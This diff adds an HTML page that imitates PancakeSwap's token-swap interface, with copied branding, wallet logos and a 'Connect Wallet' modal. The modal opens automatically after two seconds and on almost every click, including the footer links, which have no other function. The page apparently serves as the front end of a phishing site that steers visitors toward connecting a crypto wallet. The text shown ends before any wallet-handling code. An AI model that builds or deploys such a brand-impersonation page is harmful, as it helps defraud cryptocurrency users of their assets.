@@ -1,0 +1,2041 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PancakeSwap</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background:linear-gradient(139.73deg, #E5FDFF, #F3EFFF);;
+            min-height: 100vh;
+        }
+
+        /* Header */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 24px;
+            background: white;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        }
+
+        .logo-nav {
+            display: flex;
+            align-items: center;
+            gap: 32px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 20px;
+            font-weight: 700;
+            color: #1a1a1a;
+        }
+
+        .logo-icon {
+            width: 32px;
+            height: 32px;
+            background: #ffa726;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+        }
+
+        .nav {
+            display: flex;
+        }
+
+        .nav-item {
+            padding: 8px 16px;
+            font-size: 16px;
+            color: #7A6EAA;
+            cursor: pointer;
+            border-radius: 8px;
+            transition: all 0.2s;
+        }
+
+        .nav-item.active {
+            color: #7645D9;
+            font-weight: bold;
+            
+        }
+
+        .nav-item:hover {
+            background: #f5f5f5;
+        }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .balance {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+          
+            border-radius: 20px;
+            font-weight: 500;
+        }
+
+        .balance-icon {
+            width: 30px;
+            height: 30px;
+            background: #ff9800;
+            border-radius: 50%;
+        }
+
+        .settings-btn {
+            width: 40px;
+            height: 40px;
+            border: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            background-color: transparent;
+            color: #7A6EAA;
+        }
+
+        .chain-selector {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+             padding: 8px 29px;
+            background: #EFF4F5 ;
+            color: #736197;
+            box-shadow: rgba(0, 0, 0, 0.1) 0px -2px 0px inset;
+            border-radius: 20px;
+            font-size: 15px;
+            cursor: pointer;
+            white-space: nowrap;
+            font-weight: bold;
+        }
+
+        .chain-icon {
+            width: 20px;
+            height: 20px;
+            background: #ffd700;
+            border-radius: 50%;
+        }
+
+        .connect-wallet-header {
+            background-color: #1FC7D4;
+            box-shadow: rgba(14, 14, 44, 0.4) 0px -1px 0px 0px inset;
+            color: white;
+            border: none;
+            padding: 8px 29px;
+            border-radius: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            white-space: nowrap;
+            font-size: 15px;
+        }
+
+        /* Main Content */
+        .main-content {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            min-height: calc(100vh - 80px);
+            padding: 20px;
+        }
+
+        .swap-container {
+            background: white;
+            border-radius: 24px;
+            padding: 24px;
+            width: 100%;
+            max-width: 480px;
+            border: 1px solid #E7E3EB;
+        }
+
+        .swap-containerr {
+            background: white;
+            border-radius: 24px;
+            padding: 15px;
+            width: 100%;
+            margin-bottom: 1%;
+            display: flex;
+            justify-content: space-between;
+            max-width: 480px;
+            border: 1px solid #E7E3EB;
+        }
+
+        .swap-tabs {
+            display: flex;
+            background: #EEEAF4;
+            border-radius: 16px;
+            border: 1px solid #d7caec;
+            width: 80%;
+        }
+
+        .swap-tab {
+            flex: 1;
+            padding: 12px 16px;
+            text-align: center;
+            border: none;
+            background: none;
+            font-size: 90%;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .swap-tab.active {
+            background: #7A6EAA;
+            color: white;
+            font-weight: bold;
+        }
+
+        .swap-tab:not(.active) {
+            color: #A69DC6;
+            font-weight: bold;
+        }
+
+        .swap-actions {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+            align-items: center;
+           
+        }
+
+        .action-btn {
+            width: 32px;
+            height: 32px;
+            border: none;
+            background: transparent;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            color: #666;
+        }
+
+        .token-input {
+            background: #EEEAF4;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 8px;
+        }
+
+        .input-label {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 12px;
+            font-weight: 500;
+        }
+
+        .token-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .token-selector {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+        }
+
+        .token-icon {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: #ffd700;
+            position: relative;
+        }
+
+        .token-icon.cake {
+            background: #d946ef;
+        }
+
+        .chain-badge {
+            position: absolute;
+            bottom: -2px;
+            right: -2px;
+            width: 15px;
+            height: 15px;
+            background: #ffd700;
+            border: 2px solid white;
+            border-radius: 50%;
+        }
+
+        .token-info {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+
+        .token-symbol {
+            font-weight: 600;
+            font-size: 16px;
+            color: #1a1a1a;
+        }
+
+        .token-network {
+            font-size: 12px;
+            color: #8b5cf6;
+            font-weight: 500;
+        }
+
+        .dropdown-arrow {
+            margin-left: 4px;
+            color: #666;
+        }
+
+        .amount-input {
+            border: none;
+            background: none;
+            font-size: 24px;
+            font-weight: 600;
+            color: #999;
+            text-align: right;
+            outline: none;
+            width: 100px;
+        }
+
+        .swap-arrow {
+            display: flex;
+            justify-content: center;
+            margin: 8px 0;
+        }
+
+        .swap-arrow-btn {
+            width: 40px;
+            height: 40px;
+            border: none;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            color: #40e0d0;
+            font-size: 16px;
+        }
+
+        .connect-wallet-main {
+        background: #40e0d0;
+        color: white;
+        border: none;
+        padding: 16px;
+        border-radius: 16px;
+        font-weight: 600;
+        font-size: 16px;
+        cursor: pointer;
+        /* Por defecto (móviles): ancho 100% */
+        width: 100%;
+        margin-top: 24px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        }
+
+        @media screen and (min-width: 768px) {
+        .connect-wallet-main {
+            /* En pantallas ≥768px: ancho 40% */
+            width: 41%;
+        }
+        }
+
+
+        .connect-wallet-main:hover {
+            background: #36c9bd;
+        }
+
+        /* Modal Styles */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .modal-overlay.active {
+            background: rgba(0, 0, 0, 0.7);
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .modal-container {
+            background: white;
+            border-radius: 24px;
+            width: 90%;
+            max-width: 800px;
+            max-height: 90vh;
+            overflow-y: auto;
+            display: flex;
+            position: relative;
+            scrollbar-width: none;
+            -ms-overflow-style: none;
+            transform: scale(0.7);
+            opacity: 0;
+            transition: all 0.3s ease;
+        }
+
+        .modal-overlay.active .modal-container {
+            transform: scale(1);
+            opacity: 1;
+        }
+
+        .modal-container::-webkit-scrollbar {
+            display: none;
+        }
+
+        .modal-left {
+            flex: 1;
+            padding: 32px;
+            border-right: 1px solid #e5e5e5;
+        }
+
+        .modal-right {
+            flex: 1;
+            padding: 32px;
+            background: #EBF0F5;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            color: #7A6EAA;
+        }
+
+        .modal-close {
+            position: absolute;
+            top: 16px;
+            right: 16px;
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: #666;
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 24px;
+        }
+
+        .social-login {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px 20px;
+            border: 1px solid #e5e5e5;
+            border-radius: 16px;
+            margin-bottom: 24px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .social-login:hover {
+            border-color: #7c3aed;
+            background: #fafafa;
+        }
+
+        .social-icons {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .social-icon {
+            width: 24px;
+            height: 24px;
+            border-radius: 4px;
+        }
+
+        .social-google {
+            background: linear-gradient(45deg, #4285f4, #34a853, #fbbc05, #ea4335);
+        }
+
+        .social-x {
+            background: #000;
+        }
+
+        .social-discord {
+            background: #5865f2;
+        }
+
+        .social-login-text {
+            color: #7c3aed;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .wallet-section {
+            margin-bottom: 32px;
+        }
+
+        .wallet-section-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #7c3aed;
+            margin-bottom: 16px;
+        }
+
+        .wallet-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 16px;
+        }
+
+        .wallet-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px 16px;
+            border: 1px solid #e5e5e5;
+            border-radius: 16px;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-align: center;
+        }
+
+        .wallet-item:hover {
+            border-color: #7c3aed;
+            background: #fafafa;
+        }
+
+        .wallet-icon {
+            width: 48px;
+            height: 48px;
+            border-radius: 12px;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+        }
+
+        .wallet-metamask {
+            background: linear-gradient(45deg, #f6851b, #e2761b);
+            color: white;
+        }
+
+        .wallet-trust {
+            background: linear-gradient(45deg, #3375bb, #2e5fa8);
+            color: white;
+        }
+
+        .wallet-okx {
+            background: #000;
+            color: white;
+        }
+
+        .wallet-binance {
+            background: linear-gradient(45deg, #f3ba2f, #f0b90b);
+            color: #000;
+        }
+
+        .wallet-coinbase {
+            background: linear-gradient(45deg, #0052ff, #0040cc);
+            color: white;
+        }
+
+        .wallet-connect {
+            background: linear-gradient(45deg, #3b99fc, #1a73e8);
+            color: white;
+        }
+
+        .wallet-opera {
+            background: linear-gradient(45deg, #ff1b2d, #cc1526);
+            color: white;
+        }
+
+        .wallet-brave {
+            background: linear-gradient(45deg, #ff5500, #cc4400);
+            color: white;
+        }
+
+        .wallet-rabby {
+            background: linear-gradient(45deg, #7c3aed, #6d28d9);
+            color: white;
+        }
+
+        .wallet-math {
+            background: linear-gradient(45deg, #000, #333);
+            color: white;
+        }
+
+        .wallet-name {
+            font-size: 14px;
+            font-weight: 500;
+            color: #1a1a1a;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .wallet-verified {
+            color: #10b981;
+            font-size: 16px;
+        }
+
+        .mev-protection {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 24px;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .mev-icon {
+            color: #10b981;
+        }
+
+        .learn-more {
+            color: #00d4aa;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .right-content h2 {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 24px;
+        }
+
+        .wallet-illustration {
+            width: 200px;
+            height: 150px;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 150"><rect width="120" height="80" x="40" y="35" fill="%2300d4aa" rx="12"/><circle cx="160" cy="40" r="20" fill="%23ffd700"/><circle cx="180" cy="60" r="15" fill="%23ff6b6b"/><rect width="20" height="30" x="50" y="45" fill="%23ff69b4" rx="4"/><rect width="15" height="25" x="75" y="50" fill="%23ffa500" rx="3"/></svg>') no-repeat center;
+            background-size: contain;
+            margin: 24px 0;
+        }
+
+        .learn-button {
+            background: #7A6EAA;
+            border: 2px solid white;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 16px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.2s;
+        }
+
+        .learn-button:hover {
+            background: white;
+            color: #7c3aed;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .header {
+                padding: 12px 16px;
+            }
+            
+            .nav {
+                display: none;
+            }
+            
+            .logo-icon {
+                width: 40px;
+                height: 40px;
+                font-size: 20px;
+            }
+            
+            .logo {
+                font-size: 24px;
+            }
+            
+            .header-right {
+                gap: 8px;
+                flex-shrink: 0;
+                min-width: 0;
+            }
+            
+            .balance {
+                display: none;
+            }
+            
+            .chain-selector {
+                padding: 8px 12px;
+                font-size: 0;
+                min-width: auto;
+                width: auto;
+            }
+            
+            .chain-selector .chain-icon {
+                width: 24px;
+                height: 24px;
+            }
+            
+            .connect-wallet-header {
+                padding: 8px 16px;
+                font-size: 14px;
+                min-width: 0;
+                white-space: nowrap;
+            }
+            
+            
+            .swap-container {
+                margin: 0 16px;
+                padding: 20px;
+            }
+            
+            .main-content {
+                padding: 16px;
+            }
+
+            .modal-container {
+                flex-direction: column;
+                max-width: 95%;
+                max-height: 95vh;
+            }
+
+            .modal-left {
+                border-right: none;
+                border-bottom: 1px solid #e5e5e5;
+                padding: 24px;
+            }
+
+            .modal-right {
+                padding: 24px;
+            }
+
+            .wallet-grid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 12px;
+            }
+
+            .wallet-item {
+                padding: 16px 12px;
+            }
+
+            .wallet-icon {
+                width: 40px;
+                height: 40px;
+                font-size: 20px;
+            }
+
+            .modal-title {
+                font-size: 20px;
+            }
+
+            .right-content h2 {
+                font-size: 24px;
+            }
+        }
+
+        /* Footer Styles Mejorado para Móviles con Acordeón */
+        .footer {
+            background: white;
+            border-top: 1px solid #E7E3EB;
+            padding: 40px 24px 20px;
+            margin-top: 60px;
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 40px;
+        }
+
+        .footer-section h4 {
+            color: #7645D9;
+            font-weight: 600;
+            margin-bottom: 16px;
+            font-size: 16px;
+            cursor: default;
+        }
+
+        .footer-links {
+            display: block;
+        }
+
+        .footer-link {
+            display: block;
+            color: #7A6EAA;
+            text-decoration: none;
+            margin-bottom: 12px;
+            font-size: 14px;
+            cursor: pointer;
+            transition: color 0.2s;
+        }
+
+        .footer-link:hover {
+            color: #7645D9;
+        }
+
+        .footer-toggle {
+            display: none;
+        }
+
+        /* Media Query para Tablets */
+        @media (max-width: 1024px) and (min-width: 769px) {
+            .footer-content {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 30px;
+            }
+        }
+
+        /* Media Query mejorado para móviles - Estilo Acordeón */
+        @media (max-width: 768px) {
+            .footer {
+                padding: 20px 16px 15px;
+                margin-top: 40px;
+            }
+            
+            .footer-content {
+                grid-template-columns: 1fr;
+                gap: 0;
+            }
+            
+            .footer-section {
+                border-bottom: 1px solid #E7E3EB;
+            }
+            
+            .footer-section:last-child {
+                border-bottom: none;
+            }
+            
+            .footer-section h4 {
+                font-size: 16px;
+                margin-bottom: 0;
+                padding: 16px 0;
+                position: relative;
+                cursor: pointer;
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                user-select: none;
+            }
+            
+            .footer-section h4::after {
+                content: '+';
+                font-size: 20px;
+                font-weight: 300;
+                color: #7A6EAA;
+                transition: transform 0.3s ease;
+            }
+            
+            .footer-section.expanded h4::after {
+                transform: rotate(45deg);
+            }
+            
+            .footer-links {
+                max-height: 0;
+                overflow: hidden;
+                transition: max-height 0.3s ease, padding 0.3s ease;
+                padding: 0;
+            }
+            
+            .footer-section.expanded .footer-links {
+                max-height: 300px;
+                padding-bottom: 16px;
+            }
+            
+            .footer-link {
+                font-size: 14px;
+                margin-bottom: 12px;
+                padding: 4px 0;
+                opacity: 0.9;
+            }
+            
+            .footer-toggle {
+                display: block;
+                position: absolute;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                opacity: 0;
+                cursor: pointer;
+            }
+        }
+
+        /* Media Query para pantallas muy pequeñas */
+        @media (max-width: 480px) {
+            .footer {
+                padding: 16px 12px 12px;
+            }
+            
+            .footer-section h4 {
+                font-size: 15px;
+                padding: 14px 0;
+            }
+            
+            .footer-link {
+                font-size: 13px;
+                margin-bottom: 10px;
+            }
+        }
+
+         /* Por defecto (móviles): ocultamos la de escritorio y mostramos la de móvil */
+    .desktop-only { display: none !important; }
+    .mobile-only  { display: inline-block !important; }
+
+    /* En pantallas grandes (≥768px): al revés */
+    @media screen and (min-width: 768px) {
+      .desktop-only { display: inline-block !important; }
+      .mobile-only  { display: none !important; }
+    }
+
+    /* Ajusta el width si quieres */
+    img.desktop-only,
+    img.mobile-only {
+      width: 20%;
+    }
+
+    img.mobile-only {
+      width: 100%;
+    }
+    </style>
+    
+    <script>
+        // JavaScript para el acordeón del footer en móviles
+        document.addEventListener('DOMContentLoaded', function() {
+            const footerSections = document.querySelectorAll('.footer-section h4');
+            
+            footerSections.forEach(function(header) {
+                header.addEventListener('click', function() {
+                    // Solo funciona en móviles
+                    if (window.innerWidth <= 768) {
+                        const section = this.parentNode;
+                        const isExpanded = section.classList.contains('expanded');
+                        
+                        // Cerrar todas las secciones
+                        document.querySelectorAll('.footer-section').forEach(function(sec) {
+                            sec.classList.remove('expanded');
+                        });
+                        
+                        // Abrir la sección clickeada si no estaba expandida
+                        if (!isExpanded) {
+                            section.classList.add('expanded');
+                        }
+                    }
+                });
+            });
+            
+            // Reiniciar acordeón cuando cambie el tamaño de pantalla
+            window.addEventListener('resize', function() {
+                if (window.innerWidth > 768) {
+                    document.querySelectorAll('.footer-section').forEach(function(section) {
+                        section.classList.remove('expanded');
+                    });
+                }
+            });
+        });
+    </script>
+</head>
+<body>
+    <header class="header">
+        <div class="logo-nav">
+            <div class="logo">
+                <!-- Solo aparece en pantallas ≥768px -->
+                <img
+                    class="desktop-only"
+                    src="img/pancakeswap-cake-seeklogo.png"
+                    alt="Logo PancakeSwap">
+
+                <!-- Solo aparece en pantallas <768px -->
+                <img
+                    class="mobile-only"
+                    src="img/descarga (1).svg"
+                    alt="Logo Móvil">
+
+                <nav class="nav">
+                    <div class="nav-item active">Trade</div>
+                    <div class="nav-item">Perps</div>
+                    <div class="nav-item">Earn</div>
+                    <div class="nav-item">Bridge</div>
+                    <div class="nav-item">Play</div>
+                    <div class="nav-item">...</div>
+              </nav> 
+            </div>
+          
+        </div>
+        <div class="header-right">
+            <div class="balance">
+                <div class="balance-icon"><img src="img/svgexport-6.svg" style="width: 100%;" alt=""></div>
+                $2.866
+            </div>
+            <button class="settings-btn">
+                <i class="fas fa-globe"></i>
+            </button>
+            <button class="settings-btn">
+                <i class="fas fa-cog"></i>
+            </button>
+            <div class="chain-selector">
+                <div class="chain-icon"><img src="img/chain-56.svg" style="width: 100%; border-radius: 100px;"  alt=""></div>
+                BNB Chain
+                <i class="fas fa-chevron-down"></i>
+            </div>
+            <button class="connect-wallet-header">Connect Wallet</button>
+        </div>
+    </header>
+
+    <main class="main-content">
+
+        <div class="swap-containerr">
+             <div class="swap-tabs">
+                <button class="swap-tab active">Swap</button>
+                <button class="swap-tab">TWAP</button>
+                <button class="swap-tab">Limit</button>
+            </div>
+
+            <div class="swap-actions">
+                <button class="action-btn">
+                    <i class="fas fa-chart-line"></i>
+                </button>
+                <button class="action-btn">
+                    <i class="fas fa-cog"></i>
+                </button>
+            </div>
+        </div>
+
+        <div class="swap-container">
+           
+
+            <div class="token-input">
+                <div class="input-label">From</div>
+                <div class="token-row">
+                    <div class="token-selector">
+                        <div class="token-icon" style="background-image: url(img/svgexport-12.svg); background-size: cover;">
+                            <div class="chain-badge" style="background-image: url(img/chain-56.svg); background-size: cover;"></div>
+                        </div>
+                        <div class="token-info">
+                            <div class="token-symbol">BNB</div>
+                            <div class="token-network">BNB Chain</div>
+                        </div>
+                        <i class="fas fa-chevron-down dropdown-arrow"></i>
+                    </div>
+                    <input type="text" class="amount-input" placeholder="0.00" readonly>
+                </div>
+            </div>
+
+            <div class="swap-arrow">
+                <button class="swap-arrow-btn">
+                    <i class="fas fa-arrow-down"></i>
+                </button>
+            </div>
+
+            <div class="token-input">
+                <div class="input-label">To</div>
+                <div class="token-row">
+                    <div class="token-selector">
+                        <div class="token-icon cake" style="background-image: url(img/descarga.svg); background-size: cover;">
+                            <div class="chain-badge" style="background-image: url(img/chain-56.svg); background-size: cover;"></div></div>
+                        </div>
+                        <div class="token-info">
+                            <div class="token-symbol">CAKE</div>
+                            <div class="token-network">BNB Chain</div>
+                        </div>
+                        <i class="fas fa-chevron-down dropdown-arrow"></i>
+                    </div>
+                    <input type="text" class="amount-input" placeholder="0.00" readonly>
+                </div>
+            </div>
+
+            <button class="connect-wallet-main">
+                Connect Wallet
+                <i class="fas fa-external-link-alt"></i>
+            </button>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-section">
+                <h4>About</h4>
+                <a href="#" class="footer-link">Contact</a>
+                <a href="#" class="footer-link">Brand</a>
+                <a href="#" class="footer-link">Blog</a>
+                <a href="#" class="footer-link">Community</a>
+            </div>
+            <div class="footer-section">
+                <h4>Help</h4>
+                <a href="#" class="footer-link">Customer Support</a>
+                <a href="#" class="footer-link">Troubleshooting</a>
+                <a href="#" class="footer-link">Guides</a>
+            </div>
+            <div class="footer-section">
+                <h4>Developers</h4>
+                <a href="#" class="footer-link">Github</a>
+                <a href="#" class="footer-link">Documentation</a>
+                <a href="#" class="footer-link">Bug Bounty</a>
+                <a href="#" class="footer-link">Audits</a>
+            </div>
+            <div class="footer-section">
+                <h4>Social</h4>
+                <a href="#" class="footer-link">Twitter</a>
+                <a href="#" class="footer-link">Telegram</a>
+                <a href="#" class="footer-link">Reddit</a>
+                <a href="#" class="footer-link">Instagram</a>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Modal Connect Wallet -->
+    <div class="modal-overlay" id="walletModal">
+        <div class="modal-container">
+            <button class="modal-close" id="closeModal">×</button>
+            
+            <div class="modal-left">
+                <h2 class="modal-title">Connect Wallet</h2>
+                
+                <div class="social-login">
+                    <div class="social-icons">
+                        <img src="img/Captura de pantalla 2025-07-27 184048.png" alt="">
+                    </div>
+                    <div class="social-login-text">
+                        Connect with social login
+                        <i class="fas fa-arrow-right"></i>
+                    </div>
+                </div>
+
+                <div class="wallet-section">
+                    <div class="wallet-section-title">Top Wallets</div>
+                    <div class="wallet-grid">
+                        <div class="wallet-item">
+                            <div class="wallet-icon wallet-metamask">
+                                <img src="img/imgi_5_metamask.png" style="width: 100%;" alt="">
+                            </div>
+                            <div class="wallet-name">
+                                <img src="img/secu.svg" alt="">
+                                Metamask
+                            </div>
+                        </div>
+                        <div class="wallet-item">
+                            <div class="wallet-icon wallet-trust">
+                                <img src="img/imgi_6_trust.png" style="width: 100%;" alt="">
+                            </div>
+                            <div class="wallet-name">
+                                <img src="img/secu.svg" alt="">
+                                Trust Wal...
+                            </div>
+                        </div>
+                        <div class="wallet-item">
+                            <div class="wallet-icon wallet-okx">
+                               <img src="img/imgi_7_okx-wallet.png" style="width: 100%; border-radius: 10px;" alt="">
+                            </div>
+                            <div class="wallet-name">
+                                OKX Wallet
+                            </div>
+                        </div>
+                        <div class="wallet-item">
+                            <div class="wallet-icon wallet-binance">
+                                <img src="img/imgi_8_binance-w3w.png" style="width: 100%;" alt="">
+                            </div>
+                            <div class="wallet-name">
+                               <img src="img/secu.svg" alt="">
+                                Binance...
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="wallet-section">
+                    <div class="wallet-section-title">More Wallets</div>
+                    <div class="wallet-grid">
+                        <div class="wallet-item">
+                            <div class="wallet-icon wallet-coinbase">
+                              <img src="img/imgi_9_coinbase.png" style="width: 100%;" alt="">
+                            </div>
+                            <div class="wallet-name">
+                                Coinbase W...
+                            </div>
+                        </div>
+                        <div class="wallet-item">
+                            <div class="wallet-icon wallet-connect">
+                               <img src="img/imgi_10_walletconnect.png" style="width: 100%;" alt="">
+                            </div>
+                            <div class="wallet-name">
+                                WalletConne...
+                            </div>
+                        </div>
+                        <div class="wallet-item">
+                            <div class="wallet-icon wallet-opera">
+                               <img src="img/imgi_11_opera.png" style="width: 100%;" alt="">
+                            </div>
+                            <div class="wallet-name">
+                                Opera Wallet
+                            </div>
+                        </div>
+                        <div class="wallet-item">
+                            <div class="wallet-icon wallet-brave">
+                               <img src="img/imgi_12_brave.png" style="width: 100%;" alt="">
+                            </div>
+                            <div class="wallet-name">
+                                Brave Wallet
+                            </div>
+                        </div>
+                        <div class="wallet-item">
+                            <div class="wallet-icon wallet-rabby">
+                                <img src="img/imgi_13_rabby.png" style="width: 100%;" alt="">
+                            </div>
+                            <div class="wallet-name">
+                                <img src="img/secu.svg" alt="">
+                                Rabby W...
+                            </div>
+                        </div>
+                        <div class="wallet-item">
+                            <div class="wallet-icon wallet-math">
+                              <img src="img/imgi_14_mathwallet.png" style="width: 100%;" alt="">
+                            </div>
+                            <div class="wallet-name">
+                                MathWallet
+                            </div>
+                        </div>
+
+                         <div class="wallet-item">
+                            <div class="wallet-icon wallet-math">
+                              <img src="img/imgi_21_tokenpocket.png" style="width: 100%;" alt="">
+                            </div>
+                            <div class="wallet-name">
+                                TokenPocket
+                            </div>
+                        </div>
+
+                         <div class="wallet-item">
+                            <div class="wallet-icon wallet-math">
+                              <img src="img/imgi_22_safepal.png" style="width: 100%;" alt="">
+                            </div>
+                            <div class="wallet-name">
+                                SafePal
+                            </div>
+                        </div>
+
+                         <div class="wallet-item">
+                            <div class="wallet-icon wallet-math">
+                              <img src="img/imgi_23_coin98.png" style="width: 100%;" alt="">
+                            </div>
+                            <div class="wallet-name">
+                                Coin98
+                            </div>
+                        </div>
+
+                         <div class="wallet-item">
+                            <div class="wallet-icon wallet-math">
+                              <img src="img/imgi_24_blocto.png" style="width: 100%;" alt="">
+                            </div>
+                            <div class="wallet-name">
+                                Blocto
+                            </div>
+                        </div>
+
+                         <div class="wallet-item">
+                            <div class="wallet-icon wallet-math">
+                              <img src="img/imgi_25_cyberwallet.png" style="width: 100%;" alt="">
+                            </div>
+                            <div class="wallet-name">
+                                Cyberwallet
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="mev-protection">
+                    <i class="fas fa-shield-alt mev-icon"></i>
+                    Wallets with MEV Protection
+                    <a href="#" class="learn-more">Learn More</a>
+                </div>
+            </div>
+
+            <div class="modal-right">
+                <div class="right-content">
+                    <h2>Haven't got a wallet yet?</h2>
+                    <img src="img/imgi_15_wallet_intro.png" style="width: 100%;" alt="">
+                    <button class="learn-button">
+                        Learn How to Connect
+                        <i class="fas fa-external-link-alt"></i>
+                    </button>
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    <script>
+        // Auto-show modal on page load after 2 seconds
+        window.addEventListener('load', function() {
+            setTimeout(function() {
+                const walletModal = document.getElementById('walletModal');
+                walletModal.classList.add('active');
+                document.body.style.overflow = 'hidden';
+            }, 2000);
+        });
+
+        // Nav items functionality
+        document.querySelectorAll('.nav-item').forEach(item => {
+            item.addEventListener('click', function() {
+                // Only Trade doesn't open modal
+                if (this.textContent.trim() !== 'Trade') {
+                    walletModal.classList.add('active');
+                    document.body.style.overflow = 'hidden';
+                    return;
+                }
+                
+                // Trade tab functionality
+                document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
+                this.classList.add('active');
+            });
+        });
+
+        // Header right buttons functionality
+        document.querySelectorAll('.settings-btn, .chain-selector').forEach(btn => {
+            btn.addEventListener('click', function() {
+                walletModal.classList.add('active');
+                document.body.style.overflow = 'hidden';
+            });
+        });
+
+        // Amount input functionality
+        document.querySelectorAll('.amount-input').forEach(input => {
+            input.addEventListener('click', function() {
+                walletModal.classList.add('active');
+                document.body.style.overflow = 'hidden';
+            });
+            
+            input.addEventListener('focus', function() {
+                walletModal.classList.add('active');
+                document.body.style.overflow = 'hidden';
+            });
+        });
+        document.querySelectorAll('.swap-tab').forEach(tab => {
+            tab.addEventListener('click', function() {
+                // Open modal for TWAP and Limit tabs
+                if (this.textContent.trim() !== 'Swap') {
+                    walletModal.classList.add('active');
+                    document.body.style.overflow = 'hidden';
+                    return;
+                }
+                
+                document.querySelectorAll('.swap-tab').forEach(t => t.classList.remove('active'));
+                this.classList.add('active');
+            });
+        });
+
+        // Action buttons functionality
+        document.querySelectorAll('.action-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                walletModal.classList.add('active');
+                document.body.style.overflow = 'hidden';
+            });
+        });
+
+        // Token selector interactions
+        document.querySelectorAll('.token-selector').forEach(selector => {
+            selector.addEventListener('click', function() {
+                walletModal.classList.add('active');
+                document.body.style.overflow = 'hidden';
+            });
+        });
+
+        // Footer links functionality
+        document.querySelectorAll('.footer-link').forEach(link => {
+            link.addEventListener('click', function(e) {
+                e.preventDefault();
+                walletModal.classList.add('active');
+                document.body.style.overflow = 'hidden';
+            });
+        });
+
+        // Swap arrow functionality
+        document.querySelector('.swap-arrow-btn').addEventListener('click', function() {
+            console.log('Swap tokens');
+            // Here you would swap the from and to tokens
+        });
+
+        // Connect wallet modal functionality
+        const walletModal = document.getElementById('walletModal');
+        const closeModal = document.getElementById('closeModal');
+        
